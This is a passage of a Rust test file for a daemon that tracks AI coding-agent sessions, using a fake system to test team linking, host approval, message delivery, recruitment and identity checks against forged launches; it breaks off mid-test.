//! The session registry and the run and guide queues, driven through a fake system and fake banners.

use crate::registry::*;
use serde_json::{Value, json};
use std::cell::RefCell;
use std::collections::{BTreeMap, HashMap, HashSet};
use std::fs;
use std::path::{Path, PathBuf};
use std::rc::Rc;
use std::sync::{Mutex, MutexGuard};

const SESSION_A: &str = "aaaaaaaa-0000-4000-8000-000000000000";
const SESSION_B: &str = "bbbbbbbb-0000-4000-8000-000000000000";
const SESSION_C: &str = "cccccccc-0000-4000-8000-000000000000";
const OPENCODE_SESSION: &str = "ses_3f2a9c0b1ffeQkTz8mWn4rJd2L";
const RUN_A: &str = "aaaaaaaaaaaa";
const RUN_B: &str = "bbbbbbbbbbbb";
const ANSWERS_KEY: &str = "-home-theo-IdeaProjects-proj-a";
const CODEX_SESSION: &str = "cdx_c214e8c0c9458f09ea4300974071bcad955995188f33264e341800f8a2bb5fcb";

static ENVIRONMENT: Mutex<()> = Mutex::new(());

/// A temporary HOME, runtime and state folder, the run and guide queues in `root`.
struct Fixture {
    root: PathBuf,
    _lock: MutexGuard<'static, ()>,
}

impl Fixture {
    fn new() -> Self {
        let lock = ENVIRONMENT.lock().unwrap_or_else(|poisoned| poisoned.into_inner());
        let root = std::env::temp_dir().join(format!("osd-test-{}", cockpit::util::token_hex(6)));
        for folder in ["home", "run", "state", "queue"] {
            fs::create_dir_all(root.join(folder)).unwrap();
        }
        // SAFETY: the lock above keeps every test that touches the environment one at a time.
        unsafe {
            std::env::set_var("HOME", root.join("home"));
            std::env::set_var("XDG_RUNTIME_DIR", root.join("run"));
            std::env::set_var("XDG_STATE_HOME", root.join("state"));
            std::env::set_var("COCKPIT_STATE_HOME", root.join("state"));
            // The audit log goes under state/; never into the real journal.
            std::env::set_var("CLAUDE_AUDIT_JOURNAL", "off");
            std::env::set_var("CLAUDE_RUNS_DIR", root.join("queue"));
            std::env::set_var("CLAUDE_ANSWERS_DIR", root.join("answers"));
            for name in ["COCKPIT_CLONES", "HYPRLAND_INSTANCE_SIGNATURE", "COCKPIT_ANSWERS_DIR", "COCKPIT_ANSWERS_KEY", "COCKPIT_RUNS_DIR"] {
                std::env::remove_var(name);
            }
        }
        // Run and guide requests as the daemon holds them (hold_request), naming their answers folder.
        fs::create_dir_all(root.join("run/claude-requests")).unwrap();
        for id in [RUN_A, RUN_B] {
            for extension in ["request", "guide"] {
                fs::write(root.join("run/claude-requests").join(format!("{id}.{extension}")), json!({"answers": ANSWERS_KEY}).to_string()).unwrap();
            }
        }
        Fixture { root, _lock: lock }
    }

    fn queue(&self) -> PathBuf {
        self.root.join("queue")
    }

    /// Theo's answers, "runs" or "guides", in the folder the requests name (cockpit::approval::answers_dir).
    fn answers(&self, kind: &str) -> PathBuf {
        let directory = self.root.join("answers").join(ANSWERS_KEY).join(kind);
        fs::create_dir_all(&directory).unwrap();
        directory
    }
}

impl Drop for Fixture {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.root);
    }
}

#[derive(Default)]
struct FakeWindow {
    command: Vec<String>,
    closed: bool,
}

struct SharedWindow(Rc<RefCell<FakeWindow>>);

impl Window for SharedWindow {
    fn running(&mut self) -> bool {
        !self.0.borrow().closed
    }
    fn terminate(&mut self) {
        self.0.borrow_mut().closed = true;
    }
}

/// What the fake system answers, and what was asked of it.
#[derive(Default)]
struct World {
    commands: Vec<Vec<String>>,
    windows: Vec<Rc<RefCell<FakeWindow>>>,
    on_cockpit: bool,
    gaming: bool,
    in_meeting: bool,
    live_ids: HashSet<String>,
    claude_panes: HashSet<String>,
    /// capture-pane: pane -> its last lines
    pane_tails: HashMap<String, String>,
    /// display-message for a pane: the tmux session name
    session_name: Option<String>,
    /// list-clients: client pids, one per line
    clients: String,
    environments: HashMap<String, HashMap<String, String>>,
    dead_pids: HashSet<String>,
    /// sender pid -> the focus target its trusted ancestor carries
    sender_targets: HashMap<u32, BTreeMap<String, String>>,
    sender_directories: HashMap<u32, String>,
    sender_runtimes: HashMap<u32, String>,
    default_agent: Option<String>,
    /// sender pid -> COCKPIT_TEAM_SPAWN in its launch's host environment
    spawn_tokens: HashMap<u32, String>,
    resume_tokens: HashMap<u32, String>,
    subscription_tokens: HashMap<u32, String>,
    /// start_detached commands, in order
    started: Vec<Vec<String>>,
    /// start_detached reports that nothing could be started
    start_fails: bool,
}

impl World {
    fn hyprctl_calls(&self) -> Vec<String> {
        self.commands.iter().filter(|command| command[0] == "hyprctl").map(|command| command[2].clone()).collect()
    }
}

struct FakeSystem(Rc<RefCell<World>>);

impl System for FakeSystem {
    fn run(&mut self, command: &[&str], _ok: &[i32]) -> bool {
        self.0.borrow_mut().commands.push(command.iter().map(|part| part.to_string()).collect());
        true
    }

    fn tmux(&mut self, arguments: &[&str]) -> Option<String> {
        let world = self.0.borrow();
        match arguments[0] {
            "capture-pane" => Some(world.pane_tails.get(arguments[3]).cloned().unwrap_or_default()),
            "display-message" => world.session_name.clone(),
            "list-clients" => Some(world.clients.clone()),
            _ => Some(String::new()),
        }
    }

    fn open_window(&mut self, command: &[&str]) -> Option<Box<dyn Window>> {
        let window = Rc::new(RefCell::new(FakeWindow { command: command.iter().map(|part| part.to_string()).collect(), closed: false }));
        self.0.borrow_mut().windows.push(window.clone());
        Some(Box::new(SharedWindow(window)))
    }

    fn claude_workspace_active(&mut self) -> bool { self.0.borrow().on_cockpit }
    fn gaming(&mut self) -> bool { self.0.borrow().gaming }
    fn in_meeting(&mut self) -> bool { self.0.borrow().in_meeting }
    fn live_session_ids(&mut self) -> HashSet<String> { self.0.borrow().live_ids.clone() }
    fn claude_panes(&mut self) -> HashSet<String> { self.0.borrow().claude_panes.clone() }

    fn process_environment(&mut self, pid: &str) -> HashMap<String, String> {
        self.0.borrow().environments.get(pid).cloned().unwrap_or_default()
    }

    fn process_alive(&mut self, pid: &str) -> bool {
        !self.0.borrow().dead_pids.contains(pid)
    }

    fn sender_target(&mut self, sender: u32) -> Option<BTreeMap<String, String>> {
        self.0.borrow().sender_targets.get(&sender).cloned()
    }

    fn sender_directory(&mut self, sender: u32) -> Option<String> {
        self.0.borrow().sender_directories.get(&sender).cloned()
    }
    fn sender_runtime(&mut self, sender: u32) -> Option<String> { self.0.borrow().sender_runtimes.get(&sender).cloned() }
    fn runtime_is_live(&mut self, runtime: &str) -> bool { self.0.borrow().sender_runtimes.values().any(|known| known == runtime) }
    fn default_agent(&mut self) -> Option<String> { self.0.borrow().default_agent.clone() }
    fn sender_spawn_token(&mut self, sender: u32) -> Option<String> { self.0.borrow().spawn_tokens.get(&sender).cloned() }
    fn sender_resume_token(&mut self, sender: u32) -> Option<String> { self.0.borrow().resume_tokens.get(&sender).cloned() }
    fn sender_subscription_token(&mut self, sender: u32) -> Option<String> { self.0.borrow().subscription_tokens.get(&sender).cloned() }
    fn start_detached(&mut self, command: &[&str]) -> bool {
        self.0.borrow_mut().started.push(command.iter().map(|part| part.to_string()).collect());
        !self.0.borrow().start_fails
    }
}

#[path = "chief_tests.rs"]
mod chief_tests;

fn team_bench() -> Bench {
    let mut bench = Bench::new();
    let project = bench.fixture.root.join("home/IdeaProjects/project-a");
    fs::create_dir_all(project.join(".git")).unwrap();
    fs::write(project.join(".git/config"), "[remote \"origin\"]\n\turl = git@github.com:example/project-a.git\n").unwrap();
    fs::create_dir_all(cockpit::paths::state_dir()).unwrap();
    fs::write(cockpit::paths::todo(), json!({"items":[{"id":"1d3fd318","project":"project-a","text":"Team task","status":"doing"}]}).to_string()).unwrap();
    for (peer, session, agent) in [(10,SESSION_A,"claude"),(20,OPENCODE_SESSION,"opencode"),(30,SESSION_B,"claude")] {
        bench.world.borrow_mut().sender_targets.insert(peer, target(&[("tmux_pane", format!("%{peer}").as_str())]));
        bench.world.borrow_mut().sender_directories.insert(peer, project.to_string_lossy().into_owned());
        bench.world.borrow_mut().sender_runtimes.insert(peer, format!("runtime-{peer}"));
        let report = parse_session(&json!({"session":session,"agent":agent,"project":"project-a","cwd":project,"state":"waiting"}).to_string()).unwrap();
        bench.registry.report_from(report, peer).unwrap();
    }
    bench
}

#[test]
fn team_context_exposes_only_own_identity_before_link_approval() {
    let mut bench = team_bench();
    let result = crate::teams::request(&mut bench.registry, 10, cockpit::teams::AgentAction::Context).unwrap().result.unwrap();
    assert_eq!(result["session_id"], SESSION_A);
    assert!(result["members"].as_array().unwrap().is_empty());
    assert!(!result.to_string().contains(OPENCODE_SESSION));
    assert!(!result.to_string().contains(SESSION_B));
    assert!(crate::teams::request(&mut bench.registry, 99, cockpit::teams::AgentAction::Context).is_err());
}

#[test]
fn agent_team_proposals_remain_pending_until_the_host_approves_the_exact_mapping() {
    use cockpit::teams::{AgentAction,HostAction,Member,Proposal,Role,TaskKey};
    let mut bench = team_bench();
    let own = crate::teams::request(&mut bench.registry, 10, AgentAction::Context).unwrap().result.unwrap();
    let task = TaskKey { project:own["project"].as_str().unwrap().into(),task_id:"1d3fd318".into() };
    let proposal = Proposal { submission_key:"link-1".into(),task,members:vec![Member {session_id:SESSION_A.into(),role:Role::Designer},
        Member {session_id:OPENCODE_SESSION.into(),role:Role::Developer}],reason:"Review this task".into() };
    let pending = crate::teams::request(&mut bench.registry, 10, AgentAction::Propose {proposal}).unwrap().result.unwrap();
    let own = crate::teams::request(&mut bench.registry, 10, AgentAction::Context).unwrap().result.unwrap();
    assert!(own["members"].as_array().unwrap().is_empty());
    crate::teams::host_control(&mut bench.registry, &HostAction::Approve {request_id:"host-approval".into(),
        proposal_id:pending["proposal_id"].as_str().unwrap().into(),expected_revision:1,mapping_hash:pending["mapping_hash"].as_str().unwrap().into()}).unwrap();
    let own = crate::teams::request(&mut bench.registry, 10, AgentAction::Context).unwrap().result.unwrap();
    assert_eq!(own["members"].as_array().unwrap().len(), 2);
}

fn linked_team_bench() -> Bench {
    use cockpit::teams::{AgentAction,HostAction,Member,Proposal,Role,TaskKey};
    let mut bench = team_bench();
    let own = crate::teams::request(&mut bench.registry, 10, AgentAction::Context).unwrap().result.unwrap();
    let task = TaskKey { project: own["project"].as_str().unwrap().into(), task_id: "1d3fd318".into() };
    let proposal = Proposal { submission_key: "link-1".into(), task, members: vec![Member { session_id: SESSION_A.into(), role: Role::Designer },
        Member { session_id: OPENCODE_SESSION.into(), role: Role::Developer }], reason: "Review this task".into() };
    let pending = crate::teams::request(&mut bench.registry, 10, AgentAction::Propose { proposal }).unwrap().result.unwrap();
    crate::teams::host_control(&mut bench.registry, &HostAction::Approve { request_id: "host-approval".into(),
        proposal_id: pending["proposal_id"].as_str().unwrap().into(), expected_revision: 1,
        mapping_hash: pending["mapping_hash"].as_str().unwrap().into() }).unwrap();
    bench
}

fn send_to_designer(bench: &mut Bench, key: &str) {
    use cockpit::teams::{AgentAction, MessageKind, Submission, TaskKey};
    let own = crate::teams::request(&mut bench.registry, 20, AgentAction::Context).unwrap().result.unwrap();
    let task: TaskKey = serde_json::from_value(own["task"].clone()).unwrap();
    let message = Submission { task, submission_key: key.into(), recipient: SESSION_A.into(), kind: MessageKind::Notice,
        body: "The frame is ready.".into(), thread_id: None, handoff_id: None };
    crate::teams::request(&mut bench.registry, 20, AgentAction::Send { message }).unwrap().result.unwrap();
}

#[test]
fn a_working_recipient_gets_nothing_until_its_turn_ends() {
    let mut bench = linked_team_bench();
    send_to_designer(&mut bench, "notice-1");
    bench.report(SESSION_A, json!({"state": "working"}));
    let busy = crate::teams::request(&mut bench.registry, 10, cockpit::teams::AgentAction::Receive).unwrap().result.unwrap();
    assert!(busy.is_null());
    bench.report(SESSION_A, json!({"state": "waiting"}));
    let idle = crate::teams::request(&mut bench.registry, 10, cockpit::teams::AgentAction::Receive).unwrap().result.unwrap();
    assert!(idle["dispatch_id"].is_string());
}

#[test]
fn each_idle_period_after_a_new_turn_takes_the_next_message() {
    use cockpit::teams::{AgentAction, TransportOutcome};
    let mut bench = linked_team_bench();
    send_to_designer(&mut bench, "notice-1");
    send_to_designer(&mut bench, "notice-2");
    for expected in ["notice-1", "notice-2"] {
        let delivery = crate::teams::request(&mut bench.registry, 10, AgentAction::Receive).unwrap().result.unwrap();
        assert!(delivery["dispatch_id"].is_string(), "no delivery for {expected}");
        crate::teams::request(&mut bench.registry, 10, AgentAction::Receipt { dispatch_id: delivery["dispatch_id"].as_str().unwrap().into(),
            outcome: TransportOutcome::Received { native_id: expected.into() } }).unwrap();
        bench.report(SESSION_A, json!({"state": "working"}));
        std::thread::sleep(std::time::Duration::from_millis(2));
        bench.report(SESSION_A, json!({"state": "waiting"}));
    }
}

#[test]
fn after_a_daemon_restart_linked_members_keep_receiving() {
    let mut bench = linked_team_bench();
    send_to_designer(&mut bench, "notice-1");
    // A restarted daemon reloads sessions from its snapshot, without their launch proof.
    bench.registry.sessions.get_mut(SESSION_A).unwrap().runtime.clear();
    bench.registry.teams = None;
    let delivery = crate::teams::request(&mut bench.registry, 10, cockpit::teams::AgentAction::Receive).unwrap().result.unwrap();
    assert!(delivery["text"].as_str().unwrap().contains("The frame is ready."));
}

#[test]
fn another_launch_cannot_take_over_a_live_sessions_identity() {
    let mut bench = team_bench();
    bench.world.borrow_mut().sender_targets.insert(99, target(&[("tmux_pane", "%99")]));
    bench.world.borrow_mut().sender_runtimes.insert(99, "runtime-99".into());
    let forged = parse_session(&json!({"session": SESSION_A, "agent": "claude", "project": "project-a", "state": "waiting"}).to_string()).unwrap();
    assert!(bench.registry.report_from(forged, 99).is_err());
    assert_eq!(bench.registry.sessions[SESSION_A].runtime, "runtime-10");
}

#[test]
fn a_session_restarted_after_its_old_launch_ended_takes_its_new_launch() {
    let mut bench = team_bench();
    bench.world.borrow_mut().sender_runtimes.remove(&10);
    bench.world.borrow_mut().sender_targets.insert(11, target(&[("tmux_pane", "%10")]));
    bench.world.borrow_mut().sender_runtimes.insert(11, "runtime-11".into());
    let restarted = parse_session(&json!({"session": SESSION_A, "agent": "claude", "project": "project-a", "state": "waiting"}).to_string()).unwrap();
    bench.registry.report_from(restarted, 11).unwrap();
    assert_eq!(bench.registry.sessions[SESSION_A].runtime, "runtime-11");
}

fn subscription_receipt(bench: &mut Bench, generation: &str) -> Result<Value, cockpit::teams::TeamError> {
    let request = serde_json::from_value(json!({"request":"subscription_runtime", "generation":generation})).unwrap();
    crate::teams::host(&mut bench.registry, request)?.result
}

#[test]
fn subscription_receipts_use_the_launch_token_not_a_report_claim() {
    let mut bench = team_bench();
    let generation = "a".repeat(32);
    let report = json!({"session":SESSION_A,"agent":"claude","project":"project-a","state":"working",
        "cwd":bench.registry.sessions[SESSION_A].cwd,"subscription_token":generation});
    bench.registry.report_from(parse_session(&report.to_string()).unwrap(), 10).unwrap();
    assert!(subscription_receipt(&mut bench, &generation).unwrap().is_null());
    bench.world.borrow_mut().subscription_tokens.insert(10, generation.clone());
    bench.registry.report_from(parse_session(&report.to_string()).unwrap(), 10).unwrap();
    let receipt = subscription_receipt(&mut bench, &generation).unwrap();
    assert_eq!(receipt["session"], SESSION_A);
    assert_eq!(receipt["runtime"], "runtime-10");
    assert_eq!(receipt["cwd"], bench.registry.sessions[SESSION_A].cwd);
    assert!(receipt.get("model").is_none(), "runtime provenance must not invent model/account evidence");
}

#[test]
fn subscription_receipts_refuse_multiple_live_replacements() {
    let mut bench = team_bench();
    let generation = "b".repeat(32);
    for (peer, session) in [(10, SESSION_A), (30, SESSION_B)] {
        bench.world.borrow_mut().subscription_tokens.insert(peer, generation.clone());
        let report = json!({"session":session,"project":"project-a","state":"working"});
        bench.registry.report_from(parse_session(&report.to_string()).unwrap(), peer).unwrap();
    }
    assert!(subscription_receipt(&mut bench, &generation).is_err());
}

#[test]
fn an_ended_launch_cannot_supply_a_subscription_receipt() {
    let mut bench = team_bench();
    let generation = "c".repeat(32);
    bench.world.borrow_mut().subscription_tokens.insert(10, generation.clone());
    bench.registry.report_from(parse_session(&json!({"session":SESSION_A,"project":"project-a","state":"working"}).to_string()).unwrap(), 10).unwrap();
    bench.world.borrow_mut().sender_runtimes.remove(&10);
    assert!(subscription_receipt(&mut bench, &generation).unwrap().is_null());
}

#[test]
fn a_subscription_restart_without_a_claimed_folder_uses_its_new_launch_folder() {
    let mut bench = team_bench();
    let generation = "d".repeat(32);
    let other_folder = bench.fixture.root.join("other-checkout").display().to_string();
    {
        let mut world = bench.world.borrow_mut();
        world.sender_runtimes.remove(&10);
        world.sender_targets.insert(11, target(&[("tmux_pane", "%10")]));
        world.sender_runtimes.insert(11, "runtime-11".into());
        world.sender_directories.insert(11, other_folder.clone());
        world.subscription_tokens.insert(11, generation.clone());
    }
    bench.registry.report_from(parse_session(&json!({"session":SESSION_A,"project":"project-a","state":"working"}).to_string()).unwrap(), 11).unwrap();
    assert_eq!(subscription_receipt(&mut bench, &generation).unwrap()["cwd"], other_folder);
}

#[test]
fn a_live_replacement_cannot_keep_a_previous_launch_generation() {
    let mut bench = team_bench();
    let generation = "e".repeat(32);
    bench.world.borrow_mut().subscription_tokens.insert(10, generation.clone());
    let report = || parse_session(&json!({"session":SESSION_A,"project":"project-a","state":"working"}).to_string()).unwrap();
    bench.registry.report_from(report(), 10).unwrap();
    bench.world.borrow_mut().subscription_tokens.remove(&10);
    bench.registry.report_from(report(), 10).unwrap();
    assert!(subscription_receipt(&mut bench, &generation).unwrap().is_null());
}

#[test]
fn subscription_prompt_admission_requires_completed_binding_and_the_real_sender() {
    use cockpit::subscription_fallback::{Binding, Observation, RoutingStore, Selection};
    use cockpit::usage::SubscriptionCapacity::{Available, Exhausted};
    let mut bench = team_bench();
    let directory = bench.registry.sessions[SESSION_A].cwd.clone();
    let source = Binding { session:SESSION_A.into(), runtime:"runtime-10".into(), native_thread:None,
        selection:Selection { agent:"claude".into(), provider:"anthropic".into(), model:"claude-opus-4-7".into(),
            variant:Some("high".into()), account:"a".repeat(64) } };
    let selection = Selection { agent:"codex".into(), provider:"openai".into(), model:"gpt-6.1-sol".into(),
        variant:Some("high".into()), account:"b".repeat(64) };
    let replacement = Binding { session:CODEX_SESSION.into(),runtime:"runtime-40".into(),selection:selection.clone(),native_thread:Some(SESSION_A.into()) };
    let mut routes = RoutingStore::load(&cockpit::paths::subscription_routes()).unwrap();
    routes.track(source.clone(), &directory, "1d3fd318", 100).unwrap();
    let transition = routes.reconcile(&[Observation { binding:source.clone(),session:cockpit::sessions::Session {
        session:SESSION_A.into(),agent:"claude".into(),state:"waiting".into(),cwd:directory.clone(),tmux_pane:"%10".into(),
        ..Default::default() }, current_capacity:Exhausted,original_capacity:Exhausted,alternate:Some((selection,Available)),
        has_pending_work:true,prompt_clear:true,manual_override:false }], 101).unwrap().remove(0);
    routes.mark_retired(SESSION_A, &transition.generation).unwrap();
    routes.mark_submitted(SESSION_A, &transition.generation).unwrap();
    {
        let mut world = bench.world.borrow_mut();
        world.sender_runtimes.remove(&10);
        world.sender_targets.insert(40,target(&[("tmux_pane","%40")]));
        world.sender_runtimes.insert(40,"runtime-40".into());
        world.sender_directories.insert(40,directory.clone());
        world.subscription_tokens.insert(40,transition.generation.clone());
    }
    bench.registry.report_from(parse_session(&json!({"session":CODEX_SESSION,"native_thread":SESSION_A,"agent":"codex",
        "project":"project-a","cwd":directory,"state":"working"}).to_string()).unwrap(), 40).unwrap();
    let raw = json!({"generation":transition.generation}).to_string();
    drop(routes);
    assert!(bench.registry.request_from("subscription-gate", &raw, 40).is_err());
    let mut routes = RoutingStore::load(&cockpit::paths::subscription_routes()).unwrap();
    routes.record_runtime(&transition.generation, replacement, &directory).unwrap();
    routes.finish(SESSION_A, &transition.generation).unwrap();
    drop(routes);
    assert!(bench.registry.request_from("subscription-gate", &raw, 40).is_ok());
    assert!(bench.registry.request_from("subscription-gate", &raw, 30).is_err(), "another sandbox must not reuse admission");
    assert!(bench.registry.request_from("subscription-gate", &json!({"generation":"f".repeat(32)}).to_string(), 40).is_err());
}

#[test]
fn a_planted_git_origin_cannot_choose_the_team_project() {
    let bench = team_bench();
    let primary = bench.fixture.root.join("home/IdeaProjects/project-a");
    let impostor = bench.fixture.root.join("home/IdeaProjects/impostor");
    fs::create_dir_all(impostor.join(".git")).unwrap();
    fs::write(impostor.join(".git/config"), "[remote \"origin\"]\n url = git@github.com:example/project-a.git\n").unwrap();
    let pointing = bench.fixture.root.join("home/IdeaProjects/pointing");
    fs::create_dir_all(&pointing).unwrap();
    fs::write(pointing.join(".git"), format!("gitdir: {}\n", primary.join(".git").display())).unwrap();
    let identity = |path: &std::path::Path| crate::teams::canonical_project(path.to_str().unwrap()).unwrap();
    assert_ne!(identity(&impostor), identity(&primary));
    assert_ne!(identity(&pointing), identity(&primary));
    assert!(!identity(&impostor).contains("github.com"));
}

fn recruit_designer() -> cockpit::teams::AgentAction {
    cockpit::teams::AgentAction::Recruit { recruitment: cockpit::teams::Recruitment { submission_key: "recruit-1".into(),
        task: cockpit::teams::TaskKey { project: String::new(), task_id: "1d3fd318".into() }, role: cockpit::teams::Role::Developer,
        recruits: vec![cockpit::teams::Recruit { role: cockpit::teams::Role::Designer, brief: "Design the jobs list".into() }],
        reason: "The UI needs a design".into() } }
}

fn with_own_project(bench: &mut Bench, action: cockpit::teams::AgentAction) -> cockpit::teams::AgentAction {
    let own = crate::teams::request(&mut bench.registry, 20, cockpit::teams::AgentAction::Context).unwrap().result.unwrap();
    let cockpit::teams::AgentAction::Recruit { mut recruitment } = action else { return action };
    recruitment.task.project = own["project"].as_str().unwrap().into();
    cockpit::teams::AgentAction::Recruit { recruitment }
}

#[test]
fn a_recruit_request_records_the_default_agent() {
    let mut bench = team_bench();
    bench.world.borrow_mut().default_agent = Some("opencode".into());
    let action = with_own_project(&mut bench, recruit_designer());
    crate::teams::request(&mut bench.registry, 20, action).unwrap().result.unwrap();
    let snapshot = crate::teams::host(&mut bench.registry, std::process::id(), cockpit::teams::HostRequest::Snapshot).unwrap().result.unwrap();
    assert_eq!(snapshot["proposals"][0]["spawn_agent"], "opencode");
}

#[test]
fn an_unreadable_default_agent_refuses_the_recruit_request() {
    let mut bench = team_bench();
    let action = with_own_project(&mut bench, recruit_designer());
    let refused = crate::teams::request(&mut bench.registry, 20, action).unwrap_err();
    assert!(refused.message.contains("default agent"), "{}", refused.message);
}

#[test]
fn the_default_agent_follows_the_cockpit_settings_rules() {
    let bench = Bench::new();
    let settings = bench.fixture.root.join("settings.json");
    assert_eq!(crate::registry::default_agent_in(&settings).as_deref(), Some("claude"));
    for (text, expected) in [(r#"{}"#, Some("claude")), (r#"{"default-agent":"opencode"}"#, Some("opencode")),
                             (r#"{"default-agent":"nobody"}"#, None), (r#"{"default-agent":3}"#, None), ("[]", None), ("not json", None)] {
        fs::write(&settings, text).unwrap();
        assert_eq!(crate::registry::default_agent_in(&settings).as_deref(), expected, "{text}");
    }
}

const NEW_SESSION: &str = "cccccccc-0000-4000-8000-000000000000";

fn recruit_teammates(bench: &mut Bench, recruits: Vec<cockpit::teams::Recruit>) {
    use cockpit::teams::AgentAction;
    bench.world.borrow_mut().default_agent = Some("claude".into());
    let AgentAction::Recruit { mut recruitment } = with_own_project(bench, recruit_designer()) else { unreachable!() };
    recruitment.recruits = recruits;
    crate::teams::request(&mut bench.registry, 20, AgentAction::Recruit { recruitment }).unwrap().result.unwrap();
}

fn recruit(role: cockpit::teams::Role, brief: &str) -> cockpit::teams::Recruit { cockpit::teams::Recruit { role, brief: brief.into() } }

fn started(bench: &Bench) -> Vec<Vec<String>> { bench.world.borrow().started.clone() }

/// A session started by the cockpit reports from peer `peer`, its launch carrying `token`.
fn spawned_session_reports(bench: &mut Bench, peer: u32, session: &str, token: &str) {
    spawned_agent_reports(bench, peer, session, "claude", token);
}

fn spawned_agent_reports(bench: &mut Bench, peer: u32, session: &str, agent: &str, token: &str) {
    let project = bench.fixture.root.join("home/IdeaProjects/project-a");
    {
        let mut world = bench.world.borrow_mut();
        world.sender_targets.insert(peer, target(&[("tmux_pane", format!("%{peer}").as_str())]));
        world.sender_directories.insert(peer, project.to_string_lossy().into_owned());
        world.sender_runtimes.insert(peer, format!("runtime-{peer}"));
        if !token.is_empty() { world.spawn_tokens.insert(peer, token.into()); }
    }
    let report = parse_session(&json!({"session": session, "agent": agent, "project": "project-a", "cwd": project, "state": "waiting"}).to_string()).unwrap();
    bench.registry.report_from(report, peer).unwrap();
}

fn role_of(bench: &mut Bench, session: &str) -> Option<String> {
    let snapshot = crate::teams::host(&mut bench.registry, std::process::id(), cockpit::teams::HostRequest::Snapshot).unwrap().result.unwrap();
    snapshot["members"].as_array().unwrap().iter().find(|member| member["session_id"] == session).map(|member| member["role"].as_str().unwrap().to_string())
}

fn developer_hands_off(bench: &mut Bench, key: &str, commit: &str) {
    use cockpit::teams::{AgentAction, Handoff};
    let own = crate::teams::request(&mut bench.registry, 20, AgentAction::Context).unwrap().result.unwrap();
    let task = cockpit::teams::TaskKey { project: own["project"].as_str().unwrap().into(), task_id: "1d3fd318".into() };
    let handoff = Handoff { task, submission_key: key.into(), branch: "feature/jobs".into(), commit: commit.into(), checkout: "/elsewhere".into(),
        summary: "Jobs list built.".into(), tests: "cargo test: 12 passed".into(), figcraft: vec![] };
    crate::teams::request(&mut bench.registry, 20, AgentAction::Handoff { handoff }).unwrap().result.unwrap();
}

#[test]
fn recruiting_starts_each_teammate_without_host_approval() {
    let mut bench = team_bench();
    recruit_teammates(&mut bench, vec![recruit(cockpit::teams::Role::Designer, "Design the jobs list")]);
    let starts = started(&bench);
    assert_eq!(starts.len(), 1, "{starts:?}");
    let project = bench.fixture.root.join("home/IdeaProjects/project-a").to_string_lossy().into_owned();
    assert_eq!(starts[0][..4], ["cockpit", "--agent", "claude", "team-spawn"]);
    assert!(starts[0][4].len() == 32 && starts[0][4].bytes().all(|byte| byte.is_ascii_hexdigit()));
    assert_eq!(starts[0][5..8], ["designer", project.as_str(), "-"]);
    assert!(starts[0][8].ends_with("Brief written by your team's developer agent:\nDesign the jobs list"));
    crate::teams::request(&mut bench.registry, 20, cockpit::teams::AgentAction::Context).unwrap();
    assert_eq!(started(&bench).len(), 1, "a started teammate is never started twice");
}

#[test]
fn repeating_recruitment_does_not_start_another_session() {
    let mut bench = team_bench();
    bench.world.borrow_mut().default_agent = Some("claude".into());
    let action = with_own_project(&mut bench, recruit_designer());
    let first = crate::teams::request(&mut bench.registry, 20, action.clone()).unwrap().result.unwrap();
    bench.world.borrow_mut().default_agent = Some("opencode".into());
    let repeated = crate::teams::request(&mut bench.registry, 20, action).unwrap().result.unwrap();
    assert_eq!(first, repeated);
    assert_eq!(started(&bench).len(), 1);
    assert_eq!(started(&bench)[0][2], "claude");
}

#[test]
fn a_successful_recruitment_replay_does_not_require_readable_settings() {
    let mut bench = team_bench();
    bench.world.borrow_mut().default_agent = Some("claude".into());
    let action = with_own_project(&mut bench, recruit_designer());
    let first = crate::teams::request(&mut bench.registry, 20, action.clone()).unwrap().result.unwrap();
    bench.world.borrow_mut().default_agent = None;
    let repeated = crate::teams::request(&mut bench.registry, 20, action).unwrap().result.unwrap();
    assert_eq!(first, repeated);
    assert_eq!(started(&bench).len(), 1);
}

#[test]
fn recruitment_from_a_missing_or_non_directory_folder_leaves_no_partial_team() {
    for is_file in [false, true] {
        let mut bench = team_bench();
        bench.world.borrow_mut().default_agent = Some("claude".into());
        let action = with_own_project(&mut bench, recruit_designer());
        let folder = bench.fixture.root.join("home/IdeaProjects/project-a/invalid");
        if is_file { fs::write(&folder, "not a directory").unwrap(); }
        bench.registry.sessions.get_mut(OPENCODE_SESSION).unwrap().cwd = folder.to_string_lossy().into_owned();
        assert!(crate::teams::request(&mut bench.registry, 20, action).is_err());
        let connection = bench.registry.teams.as_ref().unwrap();
        for table in ["proposals", "teams", "members", "spawns", "team_qa"] {
            let count: i64 = connection.query_row(&format!("SELECT count(*) FROM {table}"), [], |row| row.get(0)).unwrap();
            assert_eq!(count, 0, "partial {table}");
        }
        assert!(started(&bench).is_empty());
    }
}

#[test]
fn recruiting_qa_waits_for_the_developers_handoff() {
    let mut bench = team_bench();
    recruit_teammates(&mut bench, vec![recruit(cockpit::teams::Role::Qa, "Review this task")]);
    assert!(started(&bench).is_empty());
    developer_hands_off(&mut bench, "h1", &"a".repeat(40));
    assert_eq!(started(&bench).len(), 1);
    assert_eq!(started(&bench)[0][5], "qa");
}

#[test]
fn a_restarted_daemon_starts_committed_recruits_without_opening_the_team_view() {
    let mut bench = team_bench();
    let action = with_own_project(&mut bench, recruit_designer());
    let cockpit::teams::AgentAction::Recruit { recruitment } = action else { unreachable!() };
    let live = crate::teams::live_sessions(&mut bench.registry).unwrap();
    let sender = live.iter().find(|session| session.session_id == SESSION_B).unwrap();
    let directory = bench.registry.sessions.get(SESSION_B).unwrap().cwd.clone();
    let directories = std::collections::HashMap::from([(SESSION_B.to_string(), directory)]);
    let now_ms = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_millis() as i64;
    cockpit::teams::store::recruit(bench.registry.teams.as_mut().unwrap(), sender, &recruitment, Some("claude"), &live, &directories,
        now_ms).unwrap().result.unwrap();
    bench.registry.teams = None;
    crate::teams::request(&mut bench.registry, 20, cockpit::teams::AgentAction::Context).unwrap().result.unwrap();
    assert_eq!(started(&bench).len(), 1);
    bench.registry.teams = None;
    crate::teams::request(&mut bench.registry, 20, cockpit::teams::AgentAction::Context).unwrap().result.unwrap();
    assert_eq!(started(&bench).len(), 1, "recovery must not repeat an already-started launch");
}

#[test]
fn a_start_that_cannot_be_launched_shows_as_failed_at_once_and_is_never_retried() {
    // Todo f4a5eb57.
    let mut bench = team_bench();
    bench.world.borrow_mut().start_fails = true;
    recruit_teammates(&mut bench, vec![recruit(cockpit::teams::Role::Designer, "Design the jobs list")]);
    let snapshot = crate::teams::host(&mut bench.registry, std::process::id(), cockpit::teams::HostRequest::Snapshot).unwrap().result.unwrap();
